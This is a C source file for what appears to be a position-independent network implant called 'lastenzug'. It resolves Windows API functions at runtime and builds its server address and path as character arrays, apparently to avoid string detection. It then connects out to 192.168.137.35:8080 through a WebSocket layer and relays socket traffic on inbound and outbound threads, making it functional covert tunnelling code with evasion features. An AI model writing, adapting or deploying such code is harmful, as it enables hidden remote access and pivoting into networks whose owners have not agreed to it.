#include "windows.h"

#include "ApiResolve.h"
#include "Core.h"
#include "Defines.h"
#include "Misc.h"
#include "WS.h"

void wrapOutLoop(LastenPIC *ptr_lastenPIC);

#define INIT_RETRY_COUNT 3
#define INIT_RETRY_DELAY_MS 10000 // 10 seconds

DWORD tryInitialConnection(LastenPIC *pLastenPIC, PWSTR proxy, PWSTR pUserName, PWSTR pPassword)
{

	DWORD dwSuccess = FAIL;
	int retryCount = 0;

	while (retryCount < INIT_RETRY_COUNT)
	{
		dwSuccess = initWS(pLastenPIC, proxy, pUserName, pPassword);
		if (dwSuccess == SUCCESS)
			break;

		retryCount++;
		pLastenPIC->fPointers._WaitForSingleObject((HANDLE)-1, INIT_RETRY_DELAY_MS);
	}

	return dwSuccess;
}

DWORD
lastenzug(wchar_t *wServerName, PWSTR wPath, DWORD port, PWSTR proxy, PWSTR pUserName, PWSTR pPassword)
{

	DWORD dwSuccess = FAIL;
	HANDLE hThreadOutLoop = NULL;

	LastenPIC lastenPIC = {0x00};

	lastenPIC.bContinue = TRUE;
	FD_ZERO(&lastenPIC.master_set);

	dwSuccess = resolveFPointers(&lastenPIC.fPointers);
	if (dwSuccess == FAIL)
		goto exit;

	// char wServerName1[] = {'1', '9', '2', '.', '1', '6', '8', '.', '1', '3', '7', '.', '3', '5', '\0'};

	// char wPath1[] = {'l', 'a', 's', 't', 'e', 'n', 'z', 'u', 'g', '\0'};
	wchar_t wServerName1[] = {
		L'1', L'9', L'2', L'.', L'1', L'6', L'8', L'.', L'1', L'3', L'7', L'.', L'3', L'5', L'\0'};

	wchar_t wPath1[] = {
		L'l', L'a', L's', L't', L'e', L'n', L'z', L'u', L'g', L'\0'};

	lastenPIC.wServerName = wServerName1;
	lastenPIC.port = 8080;
	lastenPIC.wPath = wPath1;

	dwSuccess = tryInitialConnection(&lastenPIC, proxy, pUserName, pPassword);
	if (dwSuccess == FAIL)
		goto exit;

	hThreadOutLoop = lastenPIC.fPointers._CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wrapOutLoop, &lastenPIC, 0, NULL);
	if (hThreadOutLoop == NULL)
		goto exit;

	dwSuccess = inLoop(&lastenPIC, proxy, pUserName, pPassword);
	if (dwSuccess == FAIL)
		goto exit;

	dwSuccess = SUCCESS;

exit:

	lastenPIC.bContinue = FALSE;
	wsClose(&lastenPIC);

	for (int i = 0; i < MAX_CONNECTIONS; i++)
	{
		if (lastenPIC.sockets[i])
			lastenPIC.fPointers._Closesocket(lastenPIC.sockets[i]);
	}

	if (hThreadOutLoop)
		lastenPIC.fPointers._WaitForSingleObject(hThreadOutLoop, INFINITE);

	if (hThreadOutLoop)
		lastenPIC.fPointers._CloseHandle(hThreadOutLoop);

	return dwSuccess;
}

void wrapOutLoop(LastenPIC *ptr_lastenPIC)
{
	outLoop(ptr_lastenPIC);
}
